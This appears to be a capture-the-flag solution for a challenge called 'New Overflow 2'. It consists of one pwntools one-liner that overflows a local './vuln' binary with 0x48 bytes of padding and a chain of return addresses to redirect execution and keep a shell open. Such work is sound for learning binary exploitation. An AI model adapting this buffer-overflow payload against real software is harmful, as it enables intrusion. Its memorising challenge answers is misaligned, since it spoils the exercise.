# New Overflow 2 :

* python code : 
```
(python -c "from pwn import *; print('a'*0x48 + p64(0x0000000000400936) + p64(0x0000000000400777) + p64(0x0000000000400936) + p64(0x00000000004007b4) + p64(0x0000000000400936) + p64(0x00000000004007be))"; cat) | ./vuln
```
